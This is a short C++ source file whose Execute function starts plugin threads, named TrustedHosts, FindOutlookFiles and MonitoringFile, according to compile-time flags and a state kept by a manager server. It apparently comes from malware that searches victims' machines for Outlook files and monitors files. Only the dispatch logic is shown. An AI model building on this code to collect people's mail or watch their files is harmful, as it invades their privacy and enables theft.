#include "plugins.h"
#include "Manager.h"
#include "task.h"

namespace Plugins
{

void Execute()
{
#ifdef PLUGINS_TRUSTED_HOSTS
	RunThread( TrustedHosts, 0 );
#endif

#ifdef PLUGINS_FIND_OUTLOOK_FILES
	if( ManagerServer::GetGlobalState(Task::GlobalState_OutlookFiles) == '0' )
	{
		RunThread( FindOutlookFiles, 0 );
		ManagerServer::SetGlobalState( Task::GlobalState_OutlookFiles, '1' );
	}
#endif

#ifdef PLUGINS_MONITORING_FILE
	RunThread( MonitoringFile, 0 );
#endif

}

}
